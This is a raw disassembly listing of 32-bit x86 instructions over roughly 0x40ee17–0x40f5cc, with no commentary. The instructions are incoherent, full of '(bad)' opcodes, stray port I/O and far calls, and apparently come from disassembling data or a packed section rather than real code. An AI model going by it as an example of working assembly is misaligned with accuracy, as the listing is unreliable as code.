  40ee17:	mov    ds:0x2359cd7f,al
  40ee1c:	inc    edx
  40ee1d:	mov    ds:0xb4d3503e,al
  40ee22:	nop
  40ee23:	cs and al,0x51
  40ee26:	ror    DWORD PTR [ebp-0x2b],cl
  40ee29:	outs   dx,BYTE PTR ds:[esi]
  40ee2a:	cmp    al,0x3e
  40ee2c:	loopne 0x40edd1
  40ee2e:	mov    bh,0xfd
  40ee30:	fwait
  40ee31:	loop   0x40edcf
  40ee33:	cli    
  40ee34:	int    0x9b
  40ee36:	shl    BYTE PTR [edx],cl
  40ee38:	(bad)  
  40ee39:	mov    al,al
  40ee3b:	sbb    eax,0x22ee6d6
  40ee40:	xchg   DWORD PTR [edx+0x5a588571],ebx
  40ee46:	int3   
  40ee47:	and    ecx,esi
  40ee49:	cmp    esp,DWORD PTR [edi+0x6365d614]
  40ee4f:	push   0xac7c57ef
  40ee54:	xchg   ebx,eax
  40ee55:	xor    ch,BYTE PTR [eax]
  40ee57:	cmp    DWORD PTR [ebx-0x7d],esi
  40ee5a:	jbe    0x40ee97
  40ee5c:	std    
  40ee5d:	call   0x127f:0x52c44611
  40ee64:	jb     0x40edf0
  40ee66:	rol    ebp,1
  40ee68:	mov    eax,ds:0xea5ffb57
  40ee6d:	and    al,0x0
  40ee6f:	iret   
  40ee70:	mov    bh,0xfb
  40ee72:	dec    edi
  40ee73:	cmp    esp,DWORD PTR [edi]
  40ee75:	dec    edx
  40ee76:	jmp    0x3207ae17
  40ee7b:	nop
  40ee7c:	dec    esi
  40ee7d:	les    ebx,FWORD PTR [esi+0x43]
  40ee80:	loopne 0x40eee3
  40ee82:	stc    
  40ee83:	(bad)  
  40ee84:	mov    bl,0x18
  40ee86:	push   ebp
  40ee87:	popf   
  40ee88:	mov    ds:0x416edddc,eax
  40ee8d:	xor    DWORD PTR [ecx+0x356a5129],edx
  40ee93:	xchg   edi,eax
  40ee94:	shl    DWORD PTR [ecx+0x18fd2dbb],0x68
  40ee9b:	lock sbb eax,0x6cf261b7
  40eea1:	push   esi
  40eea2:	mov    edi,0x717bbeca
  40eea7:	and    eax,0x45a0062e
  40eeac:	outs   dx,DWORD PTR ds:[esi]
  40eead:	pop    esp
  40eeae:	repnz push edx
  40eeb0:	lods   eax,DWORD PTR ds:[esi]
  40eeb1:	mov    cl,0xbd
  40eeb3:	inc    ebx
  40eeb4:	dec    ecx
  40eeb5:	cmp    BYTE PTR [edx-0x20],cl
  40eeb8:	pusha  
  40eeb9:	dec    ecx
  40eeba:	pop    ss
  40eebb:	adc    esi,DWORD PTR [ecx+0x6e]
  40eebe:	scas   eax,DWORD PTR es:[edi]
  40eebf:	xor    DWORD PTR [esi-0x35],ebx
  40eec2:	sbb    BYTE PTR [ebp+0x3cbd35e9],0xa8
  40eec9:	mov    cl,bh
  40eecb:	mov    dh,0xf7
  40eecd:	add    eax,DWORD PTR [ebp+ecx*8-0x2e]
  40eed1:	mov    bh,0x7
  40eed3:	out    0xb7,al
  40eed5:	xchg   edx,eax
  40eed6:	mov    dh,0x48
  40eed8:	arpl   WORD PTR [esi+0x5b970dba],sp
  40eede:	sbb    eax,0x6cbc3a6a
  40eee3:	push   ebx
  40eee4:	cmp    al,0x32
  40eee6:	mov    al,BYTE PTR [ecx]
  40eee8:	adc    eax,0x22e0b0af
  40eeed:	out    0xb9,al
  40eeef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eef0:	mov    cl,0x98
  40eef2:	inc    ebx
  40eef3:	add    al,BYTE PTR [ebp+0x2d]
  40eef6:	jge    0x40ee9d
  40eef8:	mov    esp,0xc24cc284
  40eefd:	shl    BYTE PTR [edi-0x7d99bd1c],0x60
  40ef04:	call   0xf34f:0x250aaa76
  40ef0b:	ja     0x6101907f
  40ef11:	xchg   esp,eax
  40ef12:	sbb    DWORD PTR [esi-0x3ff8b522],esi
  40ef18:	dec    esi
  40ef19:	sub    BYTE PTR [edi],0xac
  40ef1c:	sahf   
  40ef1d:	and    edi,DWORD PTR [esi+0x54]
  40ef20:	or     BYTE PTR [eax+0x75],ch
  40ef23:	dec    ebx
  40ef24:	repz adc BYTE PTR [ecx-0x39981ebf],0x8c
  40ef2c:	adc    ecx,DWORD PTR [ebx+0x79]
  40ef2f:	sar    dl,1
  40ef31:	adc    ebx,DWORD PTR fs:[esi+0x183cade6]
  40ef38:	or     eax,0xe2d99b90
  40ef3d:	sbb    esp,esi
  40ef3f:	cs stos BYTE PTR es:[edi],al
  40ef41:	push   0x37
  40ef43:	icebp  
  40ef44:	mov    edx,0xe7fe57b2
  40ef49:	mov    edx,0x34726d4c
  40ef4e:	cmp    DWORD PTR [edx+0x6b],0xd615eaef
  40ef55:	shl    esi,1
  40ef57:	jnp    0x40efa0
  40ef59:	ins    DWORD PTR es:[edi],dx
  40ef5a:	call   0xdc89:0x5c0a9677
  40ef61:	retf   0xaf11
  40ef64:	scas   eax,DWORD PTR es:[edi]
  40ef65:	(bad)  [eax+0x626a975f]
  40ef6b:	mul    DWORD PTR [edx+0x38]
  40ef6e:	js     0x40ef4b
  40ef70:	xchg   DWORD PTR [edi+0x67],edx
  40ef73:	in     al,0xb9
  40ef75:	ins    DWORD PTR es:[edi],dx
  40ef76:	shr    BYTE PTR cs:[ebx],1
  40ef79:	jcxz   0x40efba
  40ef7c:	fmul   QWORD PTR [ecx+edx*8-0x429a48e6]
  40ef83:	into   
  40ef84:	inc    edx
  40ef85:	les    ecx,FWORD PTR [edx-0x18]
  40ef88:	inc    ecx
  40ef89:	arpl   WORD PTR [ecx],di
  40ef8b:	mov    al,BYTE PTR [ebx+edx*1+0x298f03c9]
  40ef92:	xchg   edx,eax
  40ef93:	data16 sub BYTE PTR ds:0xe08a9337,0x56
  40ef9b:	and    ch,BYTE PTR [ebp-0x56]
  40ef9e:	and    dh,bh
  40efa0:	in     eax,0xe3
  40efa2:	scas   eax,DWORD PTR es:[edi]
  40efa3:	cld    
  40efa4:	sub    DWORD PTR cs:[ecx],ebx
  40efa7:	xor    eax,0xdf6ccc48
  40efac:	leave  
  40efad:	xchg   ebp,eax
  40efae:	and    eax,0x15dc69a9
  40efb3:	sbb    BYTE PTR [ebx],al
  40efb5:	popf   
  40efb6:	outs   dx,DWORD PTR ds:[esi]
  40efb7:	push   esp
  40efb8:	jmp    0x1d3:0xae86eacf
  40efbf:	lock adc edi,DWORD PTR [esi]
  40efc2:	sub    BYTE PTR [edi+0x44],cl
  40efc5:	hlt    
  40efc6:	test   eax,0xbed845a3
  40efcb:	mov    ?,ecx
  40efcd:	stc    
  40efce:	adc    al,0xa6
  40efd0:	mov    esp,0x3ede3d58
  40efd5:	rcl    BYTE PTR [ebp+0x35ed18a8],0x6e
  40efdc:	dec    esi
  40efdd:	call   0xeefa:0xf14aa37a
  40efe4:	gs loopne 0x40efc4
  40efe7:	dec    DWORD PTR [edx-0x40]
  40efea:	jl     0x40f03e
  40efec:	(bad)  
  40efee:	mov    esp,0x119e78bd
  40eff3:	test   BYTE PTR ss:[edi],al
  40eff6:	inc    ax
  40eff8:	mov    ch,0xeb
  40effa:	pop    ecx
  40effb:	mov    cl,0x1
  40effd:	shl    ch,0xd7
  40f000:	lds    ebp,FWORD PTR ds:0xe022c269
  40f006:	call   0xf3cb:0xc634276c
  40f00d:	and    eax,ecx
  40f00f:	lahf   
  40f010:	or     eax,0xbc01ee6b
  40f015:	push   cs
  40f016:	inc    eax
  40f017:	lds    edx,FWORD PTR [esi+0x73]
  40f01a:	inc    edi
  40f01b:	(bad)  
  40f01c:	fdivrp st(1),st
  40f01e:	cmp    dl,ch
  40f020:	dec    edi
  40f021:	ror    DWORD PTR [esi],cl
  40f023:	mov    ah,0x8d
  40f025:	rcl    DWORD PTR [esi+0x405a4115],cl
  40f02b:	or     bh,dl
  40f02d:	call   0xcd04603b
  40f032:	mov    cl,0x30
  40f034:	shr    DWORD PTR [ebx-0x1427fe91],cl
  40f03a:	jne    0x40f011
  40f03c:	push   ds
  40f03d:	(bad)  
  40f03f:	add    eax,0x35be3d57
  40f044:	loop   0x40f08e
  40f046:	(bad)  
  40f047:	and    ecx,ebp
  40f049:	out    dx,al
  40f04a:	jge    0x40f074
  40f04c:	inc    ebx
  40f04d:	or     eax,0xb69ec451
  40f052:	test   al,0x1a
  40f054:	shl    BYTE PTR [eax+0x3c],1
  40f057:	leave  
  40f058:	and    BYTE PTR [ebp-0x3f175e81],cl
  40f05e:	dec    esp
  40f05f:	adc    ebx,DWORD PTR [ebp+0x7cdc8018]
  40f065:	push   edx
  40f066:	popa   
  40f067:	imul   edi,DWORD PTR [ecx-0x141f85],0x6ec39eeb
  40f071:	push   ds
  40f072:	dec    esi
  40f073:	pop    ds
  40f074:	add    DWORD PTR [ebp-0x140fe33],esi
  40f07a:	jge    0x40f010
  40f07c:	mov    edi,0x3130b87e
  40f081:	jnp    0x40f05e
  40f083:	js     0x40f08c
  40f085:	int3   
  40f086:	jmp    0x40f08d
  40f088:	and    eax,0x95ac5e65
  40f08d:	ds xchg ebp,eax
  40f08f:	data16 and al,0xba
  40f092:	lods   al,BYTE PTR ds:[esi]
  40f093:	pop    edx
  40f094:	jo     0x40f084
  40f096:	sub    BYTE PTR [edx+0x43],ch
  40f099:	in     al,0x41
  40f09b:	(bad)  
  40f09c:	add    DWORD PTR [edi+0x0],0xffffffe0
  40f0a0:	in     al,dx
  40f0a1:	ror    DWORD PTR [eax-0x11],cl
  40f0a4:	cwde   
  40f0a5:	xchg   ebx,eax
  40f0a6:	or     BYTE PTR [esi],ch
  40f0a8:	xchg   ecx,eax
  40f0a9:	xor    DWORD PTR gs:[edi+0x37c46424],esp
  40f0b0:	push   esp
  40f0b1:	lea    eax,[ebx]
  40f0b3:	or     BYTE PTR [eax+0x5c],ah
  40f0b6:	ja     0x40f113
  40f0b8:	sub    esp,DWORD PTR [ecx]
  40f0ba:	or     esp,ebx
  40f0bc:	into   
  40f0bd:	push   ebx
  40f0be:	pop    es
  40f0bf:	xchg   ebp,ebp
  40f0c1:	push   0xf
  40f0c3:	add    DWORD PTR [eax-0xf],0x75f356e3
  40f0ca:	out    0x93,eax
  40f0cc:	or     al,0xd
  40f0ce:	repnz cmc 
  40f0d0:	mov    ch,0x4e
  40f0d2:	fwait
  40f0d3:	dec    ebp
  40f0d4:	xlat   BYTE PTR ds:[ebx]
  40f0d5:	mov    edi,0xb96ca139
  40f0da:	xchg   edi,eax
  40f0db:	inc    ebp
  40f0dc:	imul   ebx,esi,0xe
  40f0df:	cld    
  40f0e0:	add    edi,DWORD PTR [edx-0x7d]
  40f0e3:	lock mov al,ds:0x93e1b403
  40f0e9:	jbe    0x40f098
  40f0eb:	imul   ebx,ecx,0x78
  40f0ee:	jne    0x40f0f5
  40f0f0:	jae    0x40f0fb
  40f0f2:	add    BYTE PTR [ebp+0x4d37a9ed],al
  40f0f8:	push   es
  40f0f9:	jl     0x40f093
  40f0fb:	mov    ebx,0xc8d918a6
  40f100:	mov    ebx,0x2365876e
  40f105:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f106:	or     ecx,DWORD PTR ss:[edi]
  40f109:	lods   eax,DWORD PTR ds:[esi]
  40f10a:	loopne 0x40f0c3
  40f10c:	test   eax,0x28102022
  40f111:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f112:	adc    edi,DWORD PTR [ebx]
  40f114:	jne    0x40f10a
  40f116:	mov    edx,0xc824ea31
  40f11b:	inc    esi
  40f11c:	pop    ebx
  40f11d:	sti    
  40f11e:	cs fs pop ebp
  40f121:	test   edx,ebx
  40f123:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f124:	push   ss
  40f125:	add    esp,DWORD PTR [edx-0x445e3306]
  40f12b:	fidiv  DWORD PTR [ebx*4-0x4a2a8cbd]
  40f132:	bound  ebx,QWORD PTR [ebp+0x4d]
  40f135:	std    
  40f136:	mov    esi,0x6aee170e
  40f13b:	je     0x40f161
  40f13d:	jp     0x40f0f9
  40f13f:	mov    bl,0xcc
  40f141:	icebp  
  40f142:	mov    ebp,0xef62ccbd
  40f147:	mul    BYTE PTR [esi+0x4a]
  40f14a:	sbb    eax,0xc26d1737
  40f14f:	cdq    
  40f150:	(bad)  
  40f151:	mov    edi,0xa4bf1c20
  40f156:	sub    ch,dh
  40f158:	cdq    
  40f159:	lds    ebx,FWORD PTR [eax]
  40f15b:	ds out 0x39,al
  40f15e:	jmp    FWORD PTR [esi-0x53a40430]
  40f164:	adc    edi,ebp
  40f166:	mov    eax,ds:0xd930fc7
  40f16b:	or     eax,0x1d8df354
  40f170:	xor    bh,al
  40f172:	test   BYTE PTR [esi-0x3194817e],ch
  40f178:	lock icebp 
  40f17a:	jo     0x40f1ef
  40f17c:	xor    eax,0xe7395622
  40f181:	ja     0x40f1d1
  40f183:	dec    ebx
  40f184:	dec    eax
  40f185:	mov    al,0x13
  40f187:	retf   0x6b42
  40f18a:	cmp    DWORD PTR [esi-0x5a58df57],esp
  40f190:	mov    eax,ds:0xf03c7564
  40f195:	imul   esi,DWORD PTR [ebp-0xe89a7c0],0xef033eb5
  40f19f:	lods   al,BYTE PTR ds:[esi]
  40f1a0:	mov    ebp,0x6c3921ae
  40f1a5:	hlt    
  40f1a6:	mov    ebx,0xc92bc739
  40f1ab:	cmp    eax,0x9c9976a2
  40f1b0:	in     eax,dx
  40f1b1:	jmp    0xd7a8fc50
  40f1b6:	out    dx,eax
  40f1b7:	xor    BYTE PTR [edx+0x71],dl
  40f1ba:	sub    esp,DWORD PTR [ecx]
  40f1bc:	inc    esi
  40f1bd:	push   ss
  40f1be:	mov    bh,0x31
  40f1c0:	(bad)  
  40f1c2:	inc    eax
  40f1c3:	and    BYTE PTR [edi+0x5387e6fd],ch
  40f1c9:	cmp    eax,0x70836a98
  40f1ce:	and    al,BYTE PTR [eax-0x57]
  40f1d1:	test   al,0x1e
  40f1d3:	add    ebx,ecx
  40f1d5:	retf   0x7669
  40f1d8:	jecxz  0x40f22a
  40f1da:	mov    ecx,0xf25fbc5d
  40f1df:	out    dx,al
  40f1e0:	popf   
  40f1e1:	push   cs
  40f1e2:	inc    ebp
  40f1e3:	not    BYTE PTR [ebx+eax*1-0x16]
  40f1e7:	dec    ecx
  40f1e8:	gs mov ebx,ebp
  40f1eb:	lea    eax,[eax]
  40f1ed:	aad    0x4b
  40f1ef:	jbe    0x40f1c3
  40f1f1:	frstor [ebx+0x17395aa9]
  40f1f7:	adc    eax,0xba13b945
  40f1fc:	push   0x7e
  40f1fe:	push   eax
  40f1ff:	sbb    al,dh
  40f201:	lahf   
  40f202:	sbb    esp,DWORD PTR [ebp-0x77]
  40f205:	dec    ebp
  40f206:	adc    BYTE PTR [ebx+0x1b],al
  40f209:	cmp    DWORD PTR [bx+si+0x3b8a],esp
  40f20e:	imul   ebx,eax,0xffffff90
  40f211:	loopne 0x40f1ae
  40f213:	ret    
  40f214:	fcom   DWORD PTR [ecx+eax*1]
  40f217:	loope  0x40f247
  40f219:	test   bh,bl
  40f21b:	xor    DWORD PTR [ecx],esp
  40f21d:	stos   DWORD PTR es:[edi],eax
  40f21e:	xchg   ecx,eax
  40f21f:	jg     0x40f277
  40f221:	fist   DWORD PTR [edi-0x6ccbb026]
  40f227:	add    cl,0x2c
  40f22a:	hlt    
  40f22b:	push   eax
  40f22c:	mov    ebp,0x3f140d52
  40f231:	sbb    eax,0x4d8d79dc
  40f236:	cmp    BYTE PTR [edi],ah
  40f238:	fidivr WORD PTR [esi+esi*2-0x7e]
  40f23c:	ficomp DWORD PTR [ecx-0x23]
  40f23f:	fimul  DWORD PTR [ecx+ebx*1-0x64]
  40f243:	mov    bh,0xcd
  40f245:	xor    BYTE PTR [ebp-0xe],0x29
  40f249:	inc    ebx
  40f24a:	cmp    bl,BYTE PTR [ebp+0x6d185480]
  40f250:	jnp    0x40f27b
  40f252:	(bad)  
  40f253:	adc    esp,DWORD PTR [edi-0x13f7e13f]
  40f259:	mov    ebx,0xef058dc9
  40f25e:	pop    esi
  40f25f:	outs   dx,DWORD PTR ds:[esi]
  40f260:	bound  ecx,QWORD PTR [ebx]
  40f262:	out    0xdd,al
  40f264:	imul   eax,ebp,0xc123f7db
  40f26a:	leave  
  40f26b:	popa   
  40f26c:	push   ebp
  40f26d:	cs jns 0x40f2cb
  40f270:	add    dl,BYTE PTR [edi-0x2cae9a4d]
  40f276:	inc    ebx
  40f277:	dec    ecx
  40f278:	setp   BYTE PTR [ecx-0x394903ac]
  40f27f:	pushf  
  40f280:	inc    esi
  40f281:	test   DWORD PTR [edx-0x35],0xf0f9547a
  40f288:	test   BYTE PTR [edi-0x564cdac1],dh
  40f28e:	dec    ecx
  40f28f:	das    
  40f290:	arpl   di,bx
  40f292:	(bad)  
  40f293:	sbb    eax,0x2653fe78
  40f298:	sahf   
  40f299:	fnstenv [eax-0x10]
  40f29c:	int3   
  40f29d:	xor    al,0x24
  40f29f:	ret    
  40f2a0:	inc    eax
  40f2a1:	popf   
  40f2a2:	outs   dx,BYTE PTR ds:[esi]
  40f2a3:	or     BYTE PTR [ecx-0x2181b2be],bl
  40f2a9:	xchg   ebp,eax
  40f2aa:	cwde   
  40f2ab:	mov    dh,0xb4
  40f2ad:	aam    0x38
  40f2af:	and    al,0x25
  40f2b1:	add    edx,edx
  40f2b3:	mov    bl,0x42
  40f2b5:	pop    eax
  40f2b6:	push   edx
  40f2b7:	(bad)  
  40f2b8:	jae    0x40f2ae
  40f2ba:	in     al,dx
  40f2bb:	in     al,dx
  40f2bc:	inc    ecx
  40f2bd:	cwde   
  40f2be:	pop    esi
  40f2bf:	jecxz  0x40f266
  40f2c1:	xchg   ebp,eax
  40f2c2:	and    DWORD PTR [esi+0x78],0xffffffea
  40f2c6:	rcl    BYTE PTR [ebx],cl
  40f2c8:	hlt    
  40f2c9:	mov    eax,0x87fdc345
  40f2ce:	lods   eax,DWORD PTR ds:[esi]
  40f2cf:	addr16 call 0x5a582e2f
  40f2d5:	loop   0x40f335
  40f2d7:	inc    eax
  40f2d8:	shl    DWORD PTR es:[edx],0x25
  40f2dc:	xchg   ebp,eax
  40f2dd:	cmp    esi,DWORD PTR [ebp+0x11843217]
  40f2e3:	sub    DWORD PTR fs:[ecx],ebp
  40f2e6:	adc    DWORD PTR [edi],0x27674e7b
  40f2ec:	fisub  WORD PTR [ebp+0x74]
  40f2ef:	std    
  40f2f0:	inc    edi
  40f2f1:	les    esi,FWORD PTR ds:0xb9170833
  40f2f7:	mov    ebx,0xc6f31920
  40f2fc:	push   edx
  40f2fd:	add    al,0x36
  40f2ff:	shr    DWORD PTR [eax-0x4ea65483],1
  40f305:	jb     0x40f315
  40f307:	iret   
  40f308:	fmul   DWORD PTR [edi-0x61]
  40f30b:	mov    cs,esp
  40f30d:	sub    ebx,DWORD PTR [edi+0x2b]
  40f310:	fadd   DWORD PTR [esi+0x69f55aa9]
  40f316:	ds inc eax
  40f318:	shl    DWORD PTR [esp+eax*2-0x6dcd62b5],cl
  40f31f:	nop
  40f320:	cmp    bl,bl
  40f322:	aas    
  40f323:	xchg   edi,eax
  40f324:	push   0x2f88039c
  40f329:	adc    ah,0x35
  40f32c:	mov    al,0x69
  40f32e:	mov    DWORD PTR [ecx+0x289dcd82],0x691cd5c1
  40f338:	push   esp
  40f339:	jbe    0x40f2c4
  40f33b:	inc    eax
  40f33c:	xor    DWORD PTR [ebx-0x37],eax
  40f33f:	aam    0xc9
  40f341:	arpl   WORD PTR [ebx+0x6e],sp
  40f344:	leave  
  40f345:	cmp    eax,0x9d32d4f3
  40f34a:	or     DWORD PTR [edx-0x1f],esp
  40f34d:	cmp    ebx,DWORD PTR [ecx]
  40f34f:	cmp    dh,dh
  40f351:	fwait
  40f352:	popf   
  40f353:	fdivr  QWORD PTR [ecx]
  40f355:	rcr    DWORD PTR ds:0x56a11b00,1
  40f35b:	call   0x4816:0x7e444e91
  40f362:	sbb    bh,cl
  40f364:	popa   
  40f365:	shl    edi,1
  40f367:	jae    0x40f363
  40f369:	cmp    al,0x2c
  40f36b:	mov    DWORD PTR [ebx+0x52a3f77],edi
  40f371:	inc    esi
  40f372:	xchg   DWORD PTR [edx],ebp
  40f374:	inc    esp
  40f375:	lahf   
  40f376:	dec    ebp
  40f377:	shl    DWORD PTR [eax],1
  40f379:	dec    ebp
  40f37a:	pop    ecx
  40f37b:	je     0x40f38c
  40f37d:	cmp    al,0x61
  40f37f:	sub    ecx,ebx
  40f381:	xchg   edi,eax
  40f382:	out    dx,eax
  40f383:	outs   dx,DWORD PTR ds:[esi]
  40f384:	mov    ah,ch
  40f386:	sbb    edi,eax
  40f388:	mov    WORD PTR [ecx+0x3f26cb0a],?
  40f38e:	in     al,0xd2
  40f390:	jge    0x40f3d5
  40f392:	or     eax,eax
  40f394:	pop    edi
  40f395:	jle    0x40f366
  40f397:	cs ret 0xf68a
  40f39b:	scas   eax,DWORD PTR es:[edi]
  40f39c:	jae    0x40f3ed
  40f39e:	push   ss
  40f39f:	test   bh,bh
  40f3a1:	push   es
  40f3a2:	add    cl,dl
  40f3a4:	sbb    DWORD PTR [ebx+0x41],esp
  40f3a7:	add    al,0x94
  40f3a9:	mov    eax,0x1d9aefcb
  40f3ae:	jl     0x40f33d
  40f3b0:	push   es
  40f3b1:	(bad)
  40f3b6:	sbb    al,BYTE PTR [edi+0x2210f06b]
  40f3bc:	dec    ebp
  40f3bd:	in     al,0x37
  40f3bf:	out    0xcb,al
  40f3c1:	mov    ebx,DWORD PTR [ebx-0x3a]
  40f3c4:	inc    edx
  40f3c5:	or     edx,esi
  40f3c7:	retf   
  40f3c8:	icebp  
  40f3c9:	fst    QWORD PTR [ebx+0x1cb18759]
  40f3cf:	mov    ds:0xf20611c2,al
  40f3d4:	int3   
  40f3d5:	cmp    ebp,esi
  40f3d7:	sbb    eax,0x634aa94c
  40f3dc:	mov    edx,0x3aea965e
  40f3e1:	aam    0xa8
  40f3e3:	push   ss
  40f3e4:	cld    
  40f3e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f3e6:	rcr    DWORD PTR [edi-0x45],cl
  40f3e9:	pop    ds
  40f3ea:	and    DWORD PTR [esi],esp
  40f3ec:	mov    bl,0xc6
  40f3ee:	sbb    ch,BYTE PTR [ebp+0x5a5fdc61]
  40f3f4:	and    eax,0xb5f3b17a
  40f3f9:	sahf   
  40f3fa:	push   ss
  40f3fb:	push   cs
  40f3fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f3fd:	into   
  40f3fe:	jb     0x40f414
  40f400:	xor    eax,0x3bacf377
  40f405:	and    BYTE PTR [edx-0x5f667c89],dl
  40f40b:	mov    ecx,0x65e28893
  40f410:	shr    BYTE PTR gs:[edx],cl
  40f413:	aad    0x35
  40f415:	cmp    eax,0xabd4078e
  40f41a:	push   ebx
  40f41b:	jbe    0x40f3b9
  40f41d:	(bad)  
  40f420:	adc    dl,BYTE PTR [ecx+0x74f69a85]
  40f426:	int    0xff
  40f428:	and    bl,BYTE PTR [esi-0xe624b8d]
  40f42e:	pop    edx
  40f42f:	add    BYTE PTR [esi+0x74],dl
  40f432:	or     ah,cl
  40f434:	sar    DWORD PTR [edx+0x6d],1
  40f437:	loop   0x40f49f
  40f439:	(bad)  
  40f43a:	outs   dx,BYTE PTR ds:[esi]
  40f43b:	(bad)  
  40f43d:	cdq    
  40f43e:	test   al,0xda
  40f440:	cmp    bl,dl
  40f442:	push   edx
  40f443:	das    
  40f444:	cmp    eax,0x9708d7bd
  40f449:	cmp    edx,ebx
  40f44b:	adc    eax,esp
  40f44d:	or     ecx,eax
  40f44f:	dec    esi
  40f450:	mov    BYTE PTR [ebx],cl
  40f452:	push   esi
  40f453:	sbb    BYTE PTR ds:[edx],bl
  40f456:	sbb    DWORD PTR [edx-0x1552636d],ecx
  40f45c:	push   ebx
  40f45d:	scas   al,BYTE PTR es:[edi]
  40f45e:	mov    ch,0x33
  40f461:	ret    0x9ebb
  40f464:	inc    eax
  40f465:	push   edi
  40f466:	scas   eax,DWORD PTR es:[edi]
  40f467:	int3   
  40f468:	data16 jle 0x40f45b
  40f46b:	rcl    BYTE PTR [edi+0x1d9f1ea2],1
  40f471:	es and edi,esi
  40f474:	sub    bh,dl
  40f476:	(bad)
  40f479:	xchg   ebx,eax
  40f47a:	fld    DWORD PTR [edx+eiz*4]
  40f47d:	mov    ds:0x7ce981a6,eax
  40f482:	cli    
  40f483:	mov    edx,0x45b7391c
  40f488:	mov    ebp,DWORD PTR [eax]
  40f48a:	cmp    al,0x54
  40f48c:	dec    ebx
  40f48d:	jo     0x40f46a
  40f48f:	add    al,ah
  40f491:	fcomp  DWORD PTR [ecx-0x14]
  40f494:	out    dx,eax
  40f495:	inc    ecx
  40f496:	fstp   TBYTE PTR [ebp-0x19a01e1d]
  40f49c:	xchg   esi,eax
  40f49d:	jo     0x40f473
  40f49f:	pop    es
  40f4a0:	loopne 0x40f45a
  40f4a2:	out    dx,eax
  40f4a3:	adc    eax,0x90377d18
  40f4a8:	cli    
  40f4a9:	or     eax,DWORD PTR [ebp-0x16]
  40f4ac:	arpl   WORD PTR [ebp-0x5c],dx
  40f4af:	and    edx,0xd9b95f00
  40f4b5:	adc    eax,0xfc85d8ee
  40f4ba:	es test ch,ah
  40f4bd:	stos   DWORD PTR es:[edi],eax
  40f4be:	mov    ecx,0xa698958c
  40f4c3:	popa   
  40f4c4:	mov    cl,0xb7
  40f4c6:	xor    dl,BYTE PTR [edx-0x47002026]
  40f4cc:	ret    0x61ab
  40f4cf:	adc    al,BYTE PTR [edx-0x65]
  40f4d2:	outs   dx,BYTE PTR ds:[esi]
  40f4d3:	push   ebx
  40f4d4:	lea    ebp,[edx-0x32]
  40f4d7:	push   esi
  40f4d8:	sbb    esp,DWORD PTR [edi-0x2f]
  40f4db:	add    cl,BYTE PTR [ecx-0x19]
  40f4de:	(bad)  
  40f4df:	leave  
  40f4e0:	xchg   ecx,eax
  40f4e1:	mov    bh,0xc
  40f4e3:	dec    edx
  40f4e4:	rcl    DWORD PTR [ecx+ecx*2],cl
  40f4e7:	call   0xf60a6e8f
  40f4ec:	pop    ebx
  40f4ed:	push   esp
  40f4ee:	daa    
  40f4ef:	cs lock loop 0x40f475
  40f4f3:	test   DWORD PTR [edx],ebp
  40f4f5:	stos   DWORD PTR es:[edi],eax
  40f4f6:	stos   BYTE PTR es:[edi],al
  40f4f7:	mov    ah,0x6a
  40f4f9:	pop    esp
  40f4fa:	dec    edi
  40f4fb:	cmp    BYTE PTR [edi],cl
  40f4fd:	dec    esp
  40f4fe:	push   edx
  40f4ff:	jno    0x40f4ad
  40f501:	lods   eax,DWORD PTR ds:[esi]
  40f502:	inc    eax
  40f503:	sahf   
  40f504:	ret    
  40f505:	js     0x40f4f7
  40f507:	xlat   BYTE PTR ds:[ebx]
  40f508:	xor    al,0x7b
  40f50a:	or     ebp,DWORD PTR [ebx+eax*1]
  40f50d:	xor    eax,0xfc17e7cf
  40f512:	imul   ecx,DWORD PTR [ebp+ebx*8+0xc],0xcdd1b375
  40f51a:	mov    ecx,0xeb5302a3
  40f51f:	gs cmp edi,eax
  40f522:	ror    BYTE PTR [edx],0x8e
  40f525:	leave  
  40f526:	mov    esp,0xb24b86ed
  40f52b:	cmc    
  40f52c:	inc    edx
  40f52d:	sahf   
  40f52e:	xchg   DWORD PTR [esi-0x5b],ebp
  40f531:	pop    es
  40f532:	std    
  40f533:	hlt    
  40f534:	mov    ds:0x6f289351,eax
  40f539:	call   0xc250ab75
  40f53e:	sub    dh,BYTE PTR ss:[esi+0x4e66ed]
  40f545:	leave  
  40f546:	jbe    0x40f4f5
  40f548:	mov    ebx,0x6a46497d
  40f54d:	mov    esp,0xcb46ee3d
  40f552:	mov    ebx,0x684082fd
  40f557:	repnz mov ds:0xe5901778,al
  40f55d:	repnz dec edx
  40f55f:	mov    ds,esp
  40f561:	adc    bl,BYTE PTR [esi-0x4ae4948b]
  40f567:	mov    al,ds:0xf48bca28
  40f56c:	xor    BYTE PTR [ecx-0x4f],bh
  40f56f:	xor    al,0x20
  40f571:	jmp    FWORD PTR [ecx+0x31a67d5c]
  40f577:	fisubr DWORD PTR [eax+0x8c02851]
  40f57d:	xor    DWORD PTR [edx],ebp
  40f57f:	and    dh,ch
  40f581:	imul   esi,DWORD PTR [esi],0xffffff88
  40f584:	cld    
  40f585:	xor    edx,DWORD PTR [ecx+edi*4]
  40f588:	cmc    
  40f589:	sub    BYTE PTR [ecx-0x54061e0f],ch
  40f58f:	inc    edx
  40f590:	repnz dec edi
  40f592:	int    0xf6
  40f594:	pop    ss
  40f595:	test   DWORD PTR [esi],ebx
  40f597:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f598:	ds loope 0x40f610
  40f59b:	xchg   ecx,eax
  40f59c:	mov    cl,0xc8
  40f59e:	add    cl,BYTE PTR [eax+0x5a]
  40f5a1:	cmc    
  40f5a2:	cs sub eax,0xd6c7623b
  40f5a8:	sbb    DWORD PTR [ebp+0x3c8597ea],edx
  40f5ae:	test   esp,esp
  40f5b0:	loope  0x40f5fd
  40f5b2:	sbb    DWORD PTR [ebx],edx
  40f5b4:	hlt    
  40f5b5:	lods   eax,DWORD PTR ds:[esi]
  40f5b6:	xchg   ebx,eax
  40f5b7:	add    DWORD PTR [ebp-0x1e],ebp
  40f5ba:	stos   BYTE PTR es:[edi],al
  40f5bb:	and    ebp,DWORD PTR [eax+eax*1-0x74]
  40f5bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5c0:	xor    eax,0x6cacdcac
  40f5c5:	push   ds
  40f5c6:	rcl    BYTE PTR [eax-0x78b96db1],1
  40f5cc:	retf   0xa870
